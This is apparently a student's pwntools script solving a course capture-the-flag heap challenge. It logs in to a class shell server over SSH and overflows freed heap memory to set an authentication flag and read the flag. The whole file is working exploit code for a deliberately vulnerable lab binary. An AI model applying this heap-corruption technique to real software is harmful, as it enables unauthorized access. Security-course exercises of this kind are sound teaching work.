# heap2sex.py - Aidan Wech (Onyxymous)
# /problems/heap2s-64_1_02c33303c197f39495d76e16a3559e5a/
from pwn import *

# debug info
bin64 = './heap2-64'
elf = ELF(bin64)
context.binary = elf
context.log_level = 'debug'

# ssh variables
name = 'ahwech'
host = 'cs4401shell2.walls.ninja'
keyfile = '../../onyx_ssh_key'
d = '/problems/heap2s-64_1_02c33303c197f39495d76e16a3559e5a/'

# exploit variables
offset = 12			# distance between auth and &auth->auth
authvar = p64(0x1)		# set auth->auth to 1

# exploit string
exploit = flat({
0: b'filter',
offset: authvar})

# ssh process
s = ssh(name, host, keyfile=keyfile)
s.set_working_directory(d)
p = s.process(bin64)

p.recvline()
p.sendline(b'auth ')		# initialize the auth structure
p.recvline()
p.sendline(b'clear')		# free up the space
p.recvline()
p.sendline(exploit)		# manipulate auth->auth by overflowing into it using strdup()
p.recvline()
p.sendline(b'commit')		# read the flag
p.recvall(timeout=1)
p.close()
s.close()
